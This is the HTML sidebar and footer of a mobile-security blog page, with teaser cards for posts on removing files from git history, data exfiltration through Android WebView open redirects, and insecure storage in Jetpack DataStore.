    <a class="post-card-image-link" href="../removing-files-or-dirs-from-git-history/index.html">
        <img class="post-card-image"
            srcset="../content/images/size/w300/2022/11/23b7dc80-a4ec-11e9-91f9-fb886e0df297.png 300w,
                   ../content/images/size/w600/2022/11/23b7dc80-a4ec-11e9-91f9-fb886e0df297.png 600w,
                  ../content/images/size/w1000/2022/11/23b7dc80-a4ec-11e9-91f9-fb886e0df297.png 1000w,
                 ../content/images/size/w2000/2022/11/23b7dc80-a4ec-11e9-91f9-fb886e0df297.png 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="../content/images/size/w600/2022/11/23b7dc80-a4ec-11e9-91f9-fb886e0df297.png"
            alt="Another post about erasing files/directories from git history"
            loading="lazy"
        />
    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="../removing-files-or-dirs-from-git-history/index.html">
            <header class="post-card-header">
                <h2 class="post-card-title">Another post about erasing files/directories from git history</h2>
            </header>
            <section class="post-card-excerpt">
                <p>~ brew install git-filter-repo ~ git filter-repo --invert-paths --path 'path-to-file-or-directory' ~ git remote remove origin ~ git remote add origin git@github.com:&lt;path-to-repository&gt;.git ~ git push origin --force 'refs/heads/*'Note that I'm using brew to install git-filter-repo, you may need to look for alternative installation methods, depending on your OS.</p>
            </section>
        </a>

        <footer class="post-card-meta">
            <ul class="author-list">
                <li class="author-list-item">
                    <a href="../author/ines/index.html" class="static-avatar">
                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
                    </a>
                </li>
            </ul>
            <div class="post-card-byline-content">
                <span><a href="../author/ines/index.html">Inês Martins</a></span>
                <span class="post-card-byline-date"><time datetime="2022-11-15">Nov 15, 2022</time> <span class="bull">&bull;</span> 1 min read</span>
            </div>
        </footer>

    </div>

</article>
                    
<article class="post-card post ">

    <a class="post-card-image-link" href="../exfiltrating-data-via-webview-takeover/index.html">
        <img class="post-card-image"
            srcset="../content/images/size/w300/2022/10/maxresdefault-1-1.jpeg 300w,
                   ../content/images/size/w600/2022/10/maxresdefault-1-1.jpeg 600w,
                  ../content/images/size/w1000/2022/10/maxresdefault-1-1.jpeg 1000w,
                 ../content/images/size/w2000/2022/10/maxresdefault-1-1.jpeg 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="../content/images/size/w600/2022/10/maxresdefault-1-1.jpeg"
            alt="Exfiltrating data from Android applications via WebView Takeover (Open Redirect)"
            loading="lazy"
        />
    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="../exfiltrating-data-via-webview-takeover/index.html">
            <header class="post-card-header">
                <h2 class="post-card-title">Exfiltrating data from Android applications via WebView Takeover (Open Redirect)</h2>
            </header>
            <section class="post-card-excerpt">
                <p>In this article, I go through the scenarios in which I've been able to exfiltrate data from real Android applications, after detecting a WebView takeover (aka "Open Redirect") vulnerability.</p>
            </section>
        </a>

        <footer class="post-card-meta">
            <ul class="author-list">
                <li class="author-list-item">
                    <a href="../author/ines/index.html" class="static-avatar">
                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
                    </a>
                </li>
            </ul>
            <div class="post-card-byline-content">
                <span><a href="../author/ines/index.html">Inês Martins</a></span>
                <span class="post-card-byline-date"><time datetime="2022-10-06">Oct 6, 2022</time> <span class="bull">&bull;</span> 2 min read</span>
            </div>
        </footer>

    </div>

</article>
                    
<article class="post-card post ">

    <a class="post-card-image-link" href="../when-not-to-use-jetpack-datastore/index.html">
        <img class="post-card-image"
            srcset="../content/images/size/w300/2022/09/3.jpeg 300w,
                   ../content/images/size/w600/2022/09/3.jpeg 600w,
                  ../content/images/size/w1000/2022/09/3.jpeg 1000w,
                 ../content/images/size/w2000/2022/09/3.jpeg 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="../content/images/size/w600/2022/09/3.jpeg"
            alt="DataStore is the new SharedPreferences, old vulns still apply"
            loading="lazy"
        />
    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="../when-not-to-use-jetpack-datastore/index.html">
            <header class="post-card-header">
                <h2 class="post-card-title">DataStore is the new SharedPreferences, old vulns still apply</h2>
            </header>
            <section class="post-card-excerpt">
                <p>Neither DataStore nor SharedPreferences should be used to persist sensitive data ... but as we know, Insecure Data Storage is one of the most common vulnerabilities found in mobile applications.</p>
            </section>
        </a>

        <footer class="post-card-meta">
            <ul class="author-list">
                <li class="author-list-item">
                    <a href="../author/ines/index.html" class="static-avatar">
                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
                    </a>
                </li>
            </ul>
            <div class="post-card-byline-content">
                <span><a href="../author/ines/index.html">Inês Martins</a></span>
                <span class="post-card-byline-date"><time datetime="2022-09-15">Sep 15, 2022</time> <span class="bull">&bull;</span> 2 min read</span>
            </div>
        </footer>

    </div>

</article>

    </div>
</aside>


    </main>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="../index.html"></a> &copy; 2022</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="../assets/built/casper.js%3Fv=09ea8c463e"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>



</body>
</html>
